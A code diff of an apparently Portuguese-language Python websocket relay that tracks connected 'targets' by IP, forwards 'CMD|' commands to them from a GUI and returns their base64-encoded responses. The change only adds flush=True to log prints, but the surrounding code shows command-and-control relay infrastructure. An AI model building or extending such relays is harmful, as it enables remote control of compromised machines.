@@ -22,7 +22,7 @@ async def tratar_conexao(ws):
         prim = await ws.recv()
         if prim == "SOU_GUI":
             with lock: gui_ws = ws
-            print("[RELAY] GUI CONECTADA")
+            print("[RELAY] GUI CONECTADA", flush=True)
             await ws.send("OK_GUI")
             async for msg in ws:
                 if msg.startswith("CMD|"):
@@ -39,7 +39,7 @@ async def tratar_conexao(ws):
             ip = ws.remote_address[0]
             with lock:
                 alvos[aid] = {"ws":ws,"ip":ip,"info":info}
-            print(f"[RELAY] ALVO {aid} CONECTADO: {info}")
+            print(f"[RELAY] ALVO {aid} CONECTADO: {info}", flush=True)
             await enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
             async for msg in ws:
                 await enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(msg.encode()).decode()}")
@@ -47,12 +47,12 @@ async def tratar_conexao(ws):
         if prim != "SOU_GUI":
             with lock: alvos.pop(aid, None)
             await enviar_gui(f"SAIU_ALVO|{aid}")
-            print(f"[RELAY] ALVO {aid} DESCONECTADO")
+            print(f"[RELAY] ALVO {aid} DESCONECTADO", flush=True)
 
 async def main():
     PORTA = int(os.environ.get("PORT", 9001))
     async with websockets.serve(tratar_conexao, "0.0.0.0", PORTA):
-        print(f"[RELAY] WEBSOCKET NA PORTA {PORTA}")
+        print(f"[RELAY] WEBSOCKET NA PORTA {PORTA}", flush=True)
         await asyncio.Future()
 
 if __name__ == "__main__":
